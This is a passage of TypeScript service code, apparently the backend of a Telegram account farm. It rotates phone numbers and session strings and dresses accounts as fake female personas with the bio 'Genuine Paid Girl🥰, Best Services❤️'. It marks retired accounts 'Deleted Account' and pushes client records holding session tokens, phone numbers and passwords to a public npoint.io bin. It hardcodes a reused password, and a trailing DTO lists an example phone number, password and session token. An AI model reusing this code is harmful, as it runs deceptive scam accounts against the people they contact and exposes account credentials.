checkNpoint() {\n        const npointIdFull = \"7c2682f37bb93ef486ba\";\n        const npointIdMasked = \"f0d1e44d82893490bbde\";\n        const { data: npointMaskedClients } = await fetchWithTimeout(`https://api.npoint.io/${npointIdMasked}`);\n        const existingMaskedClients = await this.findAllMaskedObject();\n        if (areJsonsNotSame(npointMaskedClients, existingMaskedClients)) {\n            await this.npointSerive.updateDocument(npointIdMasked, existingMaskedClients);\n            console.log(\"Updated Masked Clients from Npoint\");\n        }\n        const { data: npointClients } = await fetchWithTimeout(`https://api.npoint.io/${npointIdFull}`);\n        const existingClients = await this.findAllObject();\n        if (areJsonsNotSame(npointClients, existingClients)) {\n            await this.npointSerive.updateDocument(npointIdFull, existingClients);\n            console.log(\"Updated Full Clients from Npoint\");\n        }\n    }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.clientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        this.logger.debug('Retrieving all client documents');\n        try {\n            if (this.clientsMap.size < 20) {\n                const documents = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean().exec();\n                documents.forEach(client => {\n                    this.clientsMap.set(client.clientId, client);\n                });\n                this.logger.debug(`Successfully retrieved ${documents.length} client documents`);\n                return Array.from(this.clientsMap.values());\n            } else {\n                this.logger.debug(`Retrieved ${this.clientsMap.size} clients from cache`);\n                return Array.from(this.clientsMap.values());\n            }\n        } catch (error) {\n            parseError(error, 'Failed to retrieve all clients: ', true);\n            this.logger.error(`Failed to retrieve all clients: ${error.message}`, error.stack);\n            throw error;\n        }\n    }\n\n    async findAllMasked(): Promise<Partial<Client>[]> {\n        const clients = await this.findAll();\n        const maskedClients = clients.map(client => {\n            const { session, mobile, password, ...maskedClient } = client;\n            return { ...maskedClient };\n        });\n        return maskedClients;\n    }\n\n    async findAllObject(): Promise<Record<string, Client>> {\n        this.logger.debug('Retrieving all client documents');\n        try {\n            if (this.clientsMap.size < 20) {\n                const documents = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean().exec();\n                const result = documents.reduce((acc, client) => {\n                    this.clientsMap.set(client.clientId, client);\n                    acc[client.clientId] = client;\n                    return acc;\n                }, {} as Record<string, Client>);\n\n                this.logger.debug(`Successfully retrieved ${documents.length} client documents`);\n                console.log(\"Refreshed Clients\");\n                return result;\n            } else {\n                const result = Array.from(this.clientsMap.entries()).reduce((acc, [clientId, client]) => {\n                    acc[clientId] = client;\n                    return acc;\n                }, {} as Record<string, Client>);\n                this.logger.debug(`Retrieved ${this.clientsMap.size} clients from cache`);\n                return result;\n            }\n        } catch (error) {\n            parseError(error, 'Failed to retrieve all clients: ', true);\n            this.logger.error(`Failed to retrieve all clients: ${error.message}`, error.stack);\n            throw error;\n        }\n    }\n\n    async findAllMaskedObject(query?: SearchClientDto) {\n        let filteredClients: Client[];\n\n        if (query) {\n            // Use the enhanced search functionality for consistent filtering\n            const searchResult = await this.enhancedSearch(query);\n            filteredClients = searchResult.clients;\n        } else {\n            const allClients = await this.findAll();\n            filteredClients = Array.isArray(allClients) ? allClients : Object.values(allClients);\n        }\n\n        const results = filteredClients.reduce((acc, client) => {\n            const { session, mobile, password, ...maskedClient } = client;\n            acc[client.clientId] = { clientId: client.clientId, ...maskedClient };\n            return acc;\n        }, {});\n\n        return results;\n    }\n\n    async refreshMap() {\n        console.log(\"Refreshed Clients\")\n        // Mark the cache as invalidated to prevent race conditions\n        const tempMap = new Map<string, Client>();\n        this.clientsMap = tempMap;\n    }\n\n    async findOne(clientId: string, throwErr: boolean = true): Promise<Client> {\n        const client = this.clientsMap.get(clientId)\n        if (client) {\n            return client;\n        } else {\n            const user = await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).lean().exec();\n\n            if (!user && throwErr) {\n                throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n            }\n\n            // Only cache if user exists\n            if (user) {\n                this.clientsMap.set(clientId, user);\n            }\n\n            return user;\n        }\n    }\n\n    async update(clientId: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto['_id']\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n\n        const previousUser = await this.clientModel.findOne({ clientId }).lean().exec();\n        await fetchWithTimeout(`${notifbot()}&text=Updating the Existing client: ${clientId}`);\n        console.log(\"Previous Client Values:\", previousUser);\n        const updatedUser = await this.clientModel.findOneAndUpdate(\n            { clientId },\n            { $set: updateClientDto },\n            { new: true, upsert: true }\n        ).lean().exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        await this.checkNpoint();\n        this.clientsMap.set(clientId, updatedUser);\n        console.log(\"Updated Client Values:\", updatedUser);\n        await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);\n        await fetchWithTimeout(`${process.env.uptimebot}/refreshmap`);\n        console.log(\"Refreshed Maps\")\n        console.log(\"Updated Client: \", updatedUser);\n        // Only trigger session creation if mobile or session has changed\n        if (\n            previousUser &&\n            (previousUser.mobile !== updatedUser.mobile || previousUser.session !== updatedUser.session)\n        ) {\n            setTimeout(async () => {\n                await this.sessionService.createSession({ mobile: updatedUser.mobile, password: 'Ajtdmwajt1@', maxRetries: 5 });\n            }, 60000);\n        }\n\n        // Session creation for new promote mobiles is now handled by addPromoteMobile method\n        return updatedUser;\n    }\n\n    async remove(clientId: string): Promise<Client> {\n        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log('Original filter:', filter);\n\n        // Handle special case: searching by promote mobile relationship\n        if (filter.hasPromoteMobiles !== undefined) {\n            const hasPromoteMobiles = filter.hasPromoteMobiles.toLowerCase() === 'true';\n            delete filter.hasPromoteMobiles;\n\n            if (hasPromoteMobiles) {\n                // Find clients that have promote mobiles assigned\n                const clientsWithPromoteMobiles = await this.promoteClientModel\n                    .find({ clientId: { $exists: true } })\n                    .distinct('clientId')\n                    .lean();\n\n                filter.clientId = { $in: clientsWithPromoteMobiles };\n            } else {\n                // Find clients that don't have promote mobiles assigned\n                const clientsWithPromoteMobiles = await this.promoteClientModel\n                    .find({ clientId: { $exists: true } })\n                    .distinct('clientId')\n                    .lean();\n\n                filter.clientId = { $nin: clientsWithPromoteMobiles };\n            }\n        }\n\n        // Handle text search fields with regex escaping\n        if (filter.firstName) {\n            const escapedFirstName = filter.firstName.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');\n            filter.firstName = { $regex: new RegExp(escapedFirstName, 'i') };\n        }\n\n        // Handle case-insensitive name search with regex escaping\n        if (filter.name) {\n            const escapedName = filter.name.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');\n            filter.name = { $regex: new RegExp(escapedName, 'i') };\n        }\n\n        console.log('Final filter:', filter);\n        return this.clientModel.find(filter).exec();\n    }\n\n    /**\n     * Search for clients by promote mobile numbers\n     * This replaces the old promoteMobile array search functionality\n     */\n    async searchClientsByPromoteMobile(mobileNumbers: string[]): Promise<Client[]> {\n        // Find promote clients with these mobile numbers\n        const promoteClients = await this.promoteClientModel\n            .find({\n                mobile: { $in: mobileNumbers },\n                clientId: { $exists: true }\n            })\n            .lean();\n\n        // Get unique client IDs\n        const clientIds = [...new Set(promoteClients.map(pc => pc.clientId))];\n\n        // Return the clients\n        return this.clientModel.find({ clientId: { $in: clientIds } }).exec();\n    }\n\n    /**\n     * Enhanced search with promote mobile support\n     * Supports both direct client field search and promote mobile relationship search\n     */\n    async enhancedSearch(filter: any): Promise<{\n        clients: Client[];\n        searchType: 'direct' | 'promoteMobile' | 'mixed';\n        promoteMobileMatches?: Array<{ clientId: string; mobile: string }>;\n    }> {\n        let searchType: 'direct' | 'promoteMobile' | 'mixed' = 'direct';\n        let promoteMobileMatches: Array<{ clientId: string; mobile: string }> = [];\n\n        // Check if we're searching by promote mobile\n        if (filter.promoteMobileNumber) {\n            searchType = 'promoteMobile';\n            const mobileNumber = filter.promoteMobileNumber;\n            delete filter.promoteMobileNumber;\n\n            const promoteClients = await this.promoteClientModel\n                .find({\n                    mobile: { $regex: new RegExp(mobileNumber.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'), 'i') },\n                    clientId: { $exists: true }\n                })\n                .lean();\n\n            promoteMobileMatches = promoteClients.map(pc => ({\n                clientId: pc.clientId,\n                mobile: pc.mobile\n            }));\n\n            const clientIds = promoteClients.map(pc => pc.clientId);\n            filter.clientId = { $in: clientIds };\n        }\n\n        // Apply regular search logic\n        const clients = await this.search(filter);\n\n        return {\n            clients,\n            searchType,\n            promoteMobileMatches: promoteMobileMatches.length > 0 ? promoteMobileMatches : undefined\n        };\n    }\n\n    async setupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\n        console.log(`Received New Client Request for - ${clientId}`, settingupClient)\n        if (toBoolean(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {\n            settingupClient = Date.now();\n            const existingClient = await this.findOne(clientId);\n            const existingClientMobile = existingClient.mobile\n            console.log(\"setupClientQueryDto:\", setupClientQueryDto);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } }\n            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];\n            if (newBufferClient) {\n                try {\n                    await fetchWithTimeout(`${notifbot()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);\n                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile })\n                    await connectionManager.getClient(newBufferClient.mobile);\n                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);\n                    await this.updateClientSession(newSession)\n                    // const archivedClient = await this.archivedClientService.findOne(newBufferClient.mobile)\n                    // if (archivedClient) {\n                    //     await fetchWithTimeout(`${notifbot()}&text=Using Old Session from Archived Clients- NewNumber:${newBufferClient.mobile}`);\n                    //     await this.updateClientSession(archivedClient.session)\n                    // } else {\n                    //     await connectionManager.getClient(newBufferClient.mobile, false, true);\n                    //     await this.generateNewSession(newBufferClient.mobile)\n                    // }\n                } catch (error) {\n                    parseError(error);\n                    console.log(\"Removing buffer as error\")\n                    const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n                    await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });\n                    this.telegramService.setActiveClientSetup(undefined)\n                } finally {\n                    await connectionManager.unregisterClient(newBufferClient.mobile)\n                }\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=Buffer Clients not available, Requested by ${clientId}`);\n                console.log(\"Buffer Clients not available\")\n            }\n        } else {\n            console.log(\"Profile Setup Recently tried, wait ::\", settingupClient - Date.now());\n        }\n    }\n\n    async updateClientSession(newSession: string) {\n        try {\n            let updatedUsername = '';\n            console.log(\"Updating Client Session\");\n            const setup = this.telegramService.getActiveClientSetup();\n            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;\n            await sleep(2000)\n            const client = await this.findOne(clientId);\n            await connectionManager.getClient(newMobile, { handler: true, autoDisconnect: false });\n            const firstName = (client.name).split(' ')[0];\n            const middleName = (client.name).split(' ')[1];\n            const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);\n            const middleNameCaps = middleName ? middleName[0].toUpperCase() + middleName.slice(1) : '';\n            const baseUsername = `${firstNameCaps.slice(0, 4)}${middleNameCaps.slice(0, 3)}` + fetchNumbersFromString(clientId);\n            try {\n                updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);\n            } catch (error) {\n                parseError(error, 'Error in updating username', true);\n            }\n            await fetchWithTimeout(`${notifbot()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);\n            await connectionManager.unregisterClient(newMobile);\n            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];\n            const existingClient = await this.findOne(clientId);\n            await this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });\n            await fetchWithTimeout(existingClient.deployKey, {}, 1);\n            await this.bufferClientService.remove(newMobile);\n            setTimeout(async () => {\n                await this.updateClient(clientId, 'Delayed update after buffer removal');\n            }, 15000);\n\n            try {\n                if (existingClientUser) {\n                    try {\n                        if (toBoolean(formalities)) {\n                            await connectionManager.getClient(existingMobile, { handler: true, autoDisconnect: false });\n                            console.log(\"Started Formalities\");\n                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);\n                            await this.telegramService.deleteProfilePhotos(existingMobile)\n                            await this.telegramService.updateUsername(existingMobile, '');\n                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);\n                            console.log(\"Formalities finished\");\n                            await connectionManager.unregisterClient(existingMobile);\n                            await fetchWithTimeout(`${notifbot()}&text=Formalities finished`);\n                        } else {\n                            console.log(\"Formalities skipped\")\n                        }\n                        if (archiveOld) {\n                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];\n                            const bufferClientDto: CreateBufferClientDto | UpdateBufferClientDto = {\n                                mobile: existingMobile,\n                                availableDate,\n                                session: existingClientUser.session,\n                                tgId: existingClientUser.tgId,\n                                channels: 170,\n                                status: days > 35 ? 'inactive' : 'active'\n                            }\n                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);\n                            // await this.archivedClientService.update(existingMobile, existingClient);\n                            console.log(\"client Archived: \", updatedBufferClient);\n                            await fetchWithTimeout(`${notifbot()}&text=Client Archived`);\n                        } else {\n                            console.log(\"Client Archive Skipped\")\n                            await fetchWithTimeout(`${notifbot()}&text=Client Archive Skipped`);\n                        }\n                    } catch (error) {\n                        console.log(\"Cannot Archive Old Client\");\n                        const errorDetails = parseError(error, 'Error in Archiving Old Client', true);\n                        if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                            console.log(\"Deleting User: \", existingClientUser.mobile);\n                            await this.bufferClientService.remove(existingClientUser.mobile);\n                        } else {\n                            console.log('Not Deleting user');\n                        }\n                    }\n                }\n            } catch (error) {\n                parseError(error, 'Error in Archiving Old Client outer', true);\n                console.log(\"Error in Archiving Old Client\");\n            }\n            this.telegramService.setActiveClientSetup(undefined);\n            console.log(\"Update finished Exitting Exiiting TG Service\");\n            await fetchWithTimeout(`${notifbot()}&text=Update finished`);\n        } catch (e) {\n            parseError(e, 'Error in updating client session', true);\n            this.telegramService.setActiveClientSetup(undefined)\n        }\n    }\n\n    async updateClient(clientId: string, message: string = '') {\n        console.log(`Updating Client: ${clientId} - ${message}`);\n        const now = Date.now();\n        const lastUpdate = this.lastUpdateMap.get(clientId) || 0;\n        const cooldownPeriod = 30000;\n        if (now - lastUpdate < cooldownPeriod) {\n            console.log(`Skipping update for ${clientId} - cooldown period not elapsed. Try again in ${Math.ceil((cooldownPeriod - (now - lastUpdate)) / 1000)} seconds`);\n            return;\n        }\n\n        const client = await this.findOne(clientId);\n        try {\n            this.lastUpdateMap.set(clientId, now);\n            await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\n            const telegramClient = await connectionManager.getClient(client.mobile, { handler: false });\n            await sleep(2000)\n            const me = await telegramClient.getMe();\n            const rootPath = process.cwd();\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            if (!me.username || me.username !== client.username || !me.username?.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {\n                const client = await this.findOne(clientId);\n                const firstName = (client.name).split(' ')[0];\n                const middleName = (client.name).split(' ')[1];\n                const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);\n                const middleNameCaps = middleName ? middleName[0].toUpperCase() + middleName.slice(1) : '';\n                const baseUsername = `${firstNameCaps.slice(0, 4)}${middleNameCaps.slice(0, 3)}` + fetchNumbersFromString(clientId);\n                const updatedUsername = await telegramClient.updateUsername(baseUsername);\n                await this.update(client.clientId, { username: updatedUsername })\n            }\n            await sleep(1000)\n            if (me.firstName !== client.name) {\n                await telegramClient.updateProfile(client.name, \"Genuine Paid Girl🥰, Best Services❤️\");\n            }\n            await sleep(1000)\n            await telegramClient.deleteProfilePhotos();\n            await sleep(1000)\n            await telegramClient.updatePrivacy();\n            await sleep(1000)\n            console.log(rootPath, \"trying to update dp\");\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(1000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(1000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            await fetchWithTimeout(`${notifbot()}&text=Updated Client: ${clientId} - ${message}`);\n            await fetchWithTimeout(client.deployKey);\n        } catch (error) {\n            this.lastUpdateMap.delete(clientId);\n            parseError(error)\n        } finally {\n            connectionManager.unregisterClient(client.mobile);\n        }\n    }\n\n    async updateClients() {\n        const clients = await this.findAll();\n        for (const client of Object.values(clients)) {\n            await this.updateClient(client.clientId, `Force Updating Client: ${client.clientId}`);\n        }\n    }\n\n    async generateNewSession(phoneNumber: string, attempt: number = 1) {\n        try {\n            console.log(\"String Generation started\");\n            await fetchWithTimeout(`${notifbot()}&text=String Generation started for NewNumber:${phoneNumber}`);\n            await sleep(1000);\n            const response = await fetchWithTimeout(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);\n            if (response) {\n                console.log(`Code Sent successfully`, response.data);\n                await fetchWithTimeout(`${notifbot()}&text=Code Sent successfully`);\n                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] })\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=Failed to send Code`);\n                console.log(\"Failed to send Code\", response);\n                if (attempt < 2) {\n                    await sleep(8000);\n                    await this.generateNewSession(phoneNumber, attempt + 1);\n                }\n            }\n        } catch (error) {\n            console.log(error);\n            if (attempt < 2) {\n                await sleep(8000);\n                await this.generateNewSession(phoneNumber, attempt + 1);\n            }\n        }\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<Client[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.clientModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    // ==================== PROMOTE MOBILE MANAGEMENT ====================\n\n    /**\n     * Get all promote mobiles for a client from PromoteClient collection\n     */\n    async getPromoteMobiles(clientId: string): Promise<string[]> {\n        if (!clientId) {\n            throw new BadRequestException('ClientId is required');\n        }\n        const promoteClients = await this.promoteClientModel.find({ clientId }).lean();\n        return promoteClients.map(pc => pc.mobile).filter(mobile => mobile); // Filter out null/undefined mobiles\n    }\n\n    /**\n     * Get all promote mobiles for all clients (utility for other services)\n     */\n    async getAllPromoteMobiles(): Promise<string[]> {\n        const allPromoteClients = await this.promoteClientModel.find({ clientId: { $exists: true } }).lean();\n        return allPromoteClients.map(pc => pc.mobile);\n    }\n\n    /**\n     * Check if a mobile is a promote mobile for any client\n     */\n    async isPromoteMobile(mobile: string): Promise<{ isPromote: boolean; clientId?: string }> {\n        const promoteClient = await this.promoteClientModel.findOne({ mobile }).lean();\n        return {\n            isPromote: !!promoteClient && !!promoteClient.clientId, // Only true if assigned to a client\n            clientId: promoteClient?.clientId\n        };\n    }\n\n    async addPromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        // Verify client exists\n        const client = await this.clientModel.findOne({ clientId }).lean();\n        if (!client) {\n            throw new NotFoundException(`Client ${clientId} not found`);\n        }\n\n        // Check if mobile is already a promote mobile for this or another client\n        const existingPromoteClient = await this.promoteClientModel.findOne({ mobile: mobileNumber }).lean();\n        if (existingPromoteClient) {\n            if (existingPromoteClient.clientId === clientId) {\n                throw new BadRequestException(`Mobile ${mobileNumber} is already a promote mobile for client ${clientId}`);\n            } else if (existingPromoteClient.clientId) {\n                throw new BadRequestException(`Mobile ${mobileNumber} is already assigned to client ${existingPromoteClient.clientId}`);\n            } else {\n                // Mobile exists but not assigned to any client, assign it to this client\n                await this.promoteClientModel.updateOne(\n                    { mobile: mobileNumber },\n                    { $set: { clientId } }\n                );\n            }\n        } else {\n            throw new NotFoundException(`Mobile ${mobileNumber} not found in PromoteClient collection. Please add it first.`);\n        }\n\n        return client;\n    }\n\n    async removePromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        // Verify client exists\n        const client = await this.clientModel.findOne({ clientId }).lean();\n        if (!client) {\n            throw new NotFoundException(`Client ${clientId} not found`);\n        }\n\n        // Remove clientId from the PromoteClient document (making it unassigned)\n        const result = await this.promoteClientModel.updateOne(\n            { mobile: mobileNumber, clientId },\n            { $unset: { clientId: 1 } }\n        );\n\n        if (result.matchedCount === 0) {\n            throw new NotFoundException(`Mobile ${mobileNumber} is not a promote mobile for client ${clientId}`);\n        }\n\n        return client;\n    }\n\n    /**\n     * Get IP address for a mobile number\n     * This method uses the simplified IP management system (no mobileType needed)\n     * @param mobile Mobile number to get IP for\n     * @param clientId Optional client ID for context\n     * @returns IP address string or null if none found/assigned\n     */\n    async getIpForMobile(mobile: string, clientId?: string): Promise<string | null> {\n        if (!mobile) {\n            throw new BadRequestException('Mobile number is required');\n        }\n\n        this.logger.debug(`Getting IP for mobile: ${mobile}${clientId ? ` (client: ${clientId})` : ''}`);\n\n        try {\n            // Use the simplified IP management service to get IP for mobile\n            const ipAddress = await this.ipManagementService.getIpForMobile(mobile);\n\n            if (ipAddress) {\n                this.logger.debug(`Found IP for mobile ${mobile}: ${ipAddress}`);\n                return ipAddress;\n            }\n\n            this.logger.debug(`No IP found for mobile ${mobile}`);\n            return null;\n\n        } catch (error) {\n            this.logger.error(`Failed to get IP for mobile ${mobile}: ${error.message}`, error.stack);\n            return null;\n        }\n    }\n\n    /**\n     * Check if a mobile number has an assigned IP\n     * @param mobile Mobile number to check\n     * @returns boolean indicating if IP is assigned\n     */\n    async hasMobileAssignedIp(mobile: string): Promise<boolean> {\n        const ip = await this.getIpForMobile(mobile);\n        return ip !== null;\n    }\n\n    /**\n     * Get all mobile numbers (main + promote) for a client that need IP assignment\n     * @param clientId Client ID\n     * @returns Array of mobile numbers without IP assignments\n     */\n    async getMobilesNeedingIpAssignment(clientId: string): Promise<{\n        mainMobile?: string;\n        promoteMobiles: string[];\n    }> {\n        this.logger.debug(`Getting mobiles needing IP assignment for client: ${clientId}`);\n\n        const client = await this.findOne(clientId);\n        const result = {\n            mainMobile: undefined as string | undefined,\n            promoteMobiles: [] as string[]\n        };\n\n        // Check main mobile\n        if (client.mobile && !(await this.hasMobileAssignedIp(client.mobile))) {\n            result.mainMobile = client.mobile;\n        }\n\n        // Get promote mobiles from PromoteClient collection and check for IP assignment\n        const promoteMobiles = await this.getPromoteMobiles(clientId);\n        for (const mobile of promoteMobiles) {\n            if (!(await this.hasMobileAssignedIp(mobile))) {\n                result.promoteMobiles.push(mobile);\n            }\n        }\n\n        this.logger.debug(`Mobiles needing IP assignment for client ${clientId}:`, result);\n        return result;\n    }\n\n    /**\n     * Auto-assign IPs to all mobile numbers for a client\n     * Uses the simplified IP management system (no mobileType field needed)\n     * @param clientId Client ID\n     * @returns Assignment result summary\n     */\n    async autoAssignIpsToClient(clientId: string): Promise<{\n        clientId: string;\n        mainMobile: { mobile: string; ipAddress: string | null; status: string };\n        promoteMobiles: Array<{ mobile: string; ipAddress: string | null; status: string }>;\n        summary: {\n            totalMobiles: number;\n            assigned: number;\n            failed: number;\n            errors: string[];\n        };\n    }> {\n        this.logger.debug(`Auto-assigning IPs to all mobiles for client: ${clientId}`);\n\n        const client = await this.findOne(clientId);\n        const errors: string[] = [];\n        let assigned = 0;\n        let failed = 0;\n\n        // Handle main mobile - no mobileType needed in simplified system\n        let mainMobileResult: { mobile: string; ipAddress: string | null; status: string };\n        try {\n            const mainMapping = await this.ipManagementService.assignIpToMobile({\n                mobile: client.mobile,\n                clientId: client.clientId\n                // Note: No mobileType field - simplified!\n            });\n            mainMobileResult = {\n                mobile: client.mobile,\n                ipAddress: mainMapping.ipAddress,\n                status: 'assigned'\n            };\n            assigned++;\n        } catch (error) {\n            mainMobileResult = {\n                mobile: client.mobile,\n                ipAddress: null,\n                status: 'failed'\n            };\n            errors.push(`Main mobile ${client.mobile}: ${error.message}`);\n            failed++;\n        }\n\n        // Handle promote mobiles - no mobileType needed in simplified system\n        const promoteMobileResults: Array<{ mobile: string; ipAddress: string | null; status: string }> = [];\n\n        // Get promote mobiles from PromoteClient collection\n        const promoteMobiles = await this.getPromoteMobiles(clientId);\n        for (const promoteMobile of promoteMobiles) {\n            try {\n                const promoteMapping = await this.ipManagementService.assignIpToMobile({\n                    mobile: promoteMobile,\n                    clientId: client.clientId\n                    // Note: No mobileType field - simplified!\n                });\n                promoteMobileResults.push({\n                    mobile: promoteMobile,\n                    ipAddress: promoteMapping.ipAddress,\n                    status: 'assigned'\n                });\n                assigned++;\n            } catch (error) {\n                promoteMobileResults.push({\n                    mobile: promoteMobile,\n                    ipAddress: null,\n                    status: 'failed'\n                });\n                errors.push(`Promote mobile ${promoteMobile}: ${error.message}`);\n                failed++;\n            }\n        }\n\n        const totalMobiles = 1 + promoteMobiles.length;\n\n        this.logger.log(`Auto-assignment completed for ${clientId}: ${assigned}/${totalMobiles} assigned`);\n\n        return {\n            clientId,\n            mainMobile: mainMobileResult,\n            promoteMobiles: promoteMobileResults,\n            summary: {\n                totalMobiles,\n                assigned,\n                failed,\n                errors\n            }\n        };\n    }\n\n    /**\n     * Get client IP information summary\n     * Shows which mobiles have IPs and which don't\n     * @param clientId Client ID\n     * @returns Comprehensive IP summary for the client\n     */\n    async getClientIpInfo(clientId: string): Promise<{\n        clientId: string;\n        clientName: string;\n        mainMobile: {\n            mobile: string;\n            ipAddress: string | null;\n            hasIp: boolean;\n        };\n        promoteMobiles: Array<{\n            mobile: string;\n            ipAddress: string | null;\n            hasIp: boolean;\n        }>;\n        dedicatedIps: string[];\n        summary: {\n            totalMobiles: number;\n            mobilesWithIp: number;\n            mobilesWithoutIp: number;\n        };\n    }> {\n        this.logger.debug(`Getting IP info for client: ${clientId}`);\n\n        const client = await this.findOne(clientId);\n\n        // Get IP for main mobile\n        const mainMobileIp = await this.getIpForMobile(client.mobile, clientId);\n        const mainMobile = {\n            mobile: client.mobile,\n            ipAddress: mainMobileIp,\n            hasIp: mainMobileIp !== null\n        };\n\n        // Get IPs for promote mobiles\n        const promoteMobiles = [];\n        let mobilesWithIp = mainMobile.hasIp ? 1 : 0;\n\n        // Get promote mobiles from PromoteClient collection\n        const clientPromoteMobiles = await this.getPromoteMobiles(clientId);\n        for (const mobile of clientPromoteMobiles) {\n            const ip = await this.getIpForMobile(mobile, clientId);\n            const hasIp = ip !== null;\n\n            promoteMobiles.push({\n                mobile,\n                ipAddress: ip,\n                hasIp\n            });\n\n            if (hasIp) mobilesWithIp++;\n        }\n\n        const totalMobiles = 1 + clientPromoteMobiles.length;\n        const mobilesWithoutIp = totalMobiles - mobilesWithIp;\n\n        return {\n            clientId,\n            clientName: client.name,\n            mainMobile,\n            promoteMobiles,\n            dedicatedIps: client.dedicatedIps || [],\n            summary: {\n                totalMobiles,\n                mobilesWithIp,\n                mobilesWithoutIp\n            }\n        };\n    }\n\n    /**\n     * Release IP from a mobile number\n     * @param mobile Mobile number to release IP from\n     * @returns Success status\n     */\n    async releaseIpFromMobile(mobile: string): Promise<{ success: boolean; message: string }> {\n        this.logger.debug(`Releasing IP from mobile: ${mobile}`);\n\n        try {\n            await this.ipManagementService.releaseIpFromMobile({ mobile });\n\n            this.logger.log(`Successfully released IP from mobile: ${mobile}`);\n            return {\n                success: true,\n                message: `IP released from mobile ${mobile}`\n            };\n        } catch (error) {\n            this.logger.error(`Failed to release IP from mobile ${mobile}: ${error.message}`, error.stack);\n            return {\n                success: false,\n                message: `Failed to release IP: ${error.message}`\n            };\n        }\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateClientDto {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    readonly channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    readonly dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    readonly link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    readonly name: string;\n\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\n    readonly mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    readonly password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    readonly repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    readonly promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' })\n    readonly session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    readonly username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    readonly clientId: string;\n\n    @ApiProperty({ example: 